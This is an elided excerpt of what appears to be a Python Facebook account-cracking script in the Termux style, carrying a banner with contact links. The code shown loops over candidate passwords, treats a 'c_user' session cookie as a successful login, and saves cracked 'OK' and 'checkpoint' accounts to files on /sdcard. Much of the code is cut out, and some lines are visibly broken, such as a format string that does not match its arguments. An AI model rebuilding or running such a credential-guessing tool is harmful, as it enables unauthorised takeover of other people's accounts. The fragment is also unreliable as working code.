...
........:::..:::::..::........:::.......::::......:::..:::::..:::::
 ...
 [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]
    ...
    Facebook : facebook.com/king lohare
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/SADIQ❤️-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/SADIQ🤔-CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        open('/sdcard/SADIQ_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print("\033[1;32m      Dont Forget Allah😊 ❤️\033[1;37m")
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/+923456170815")
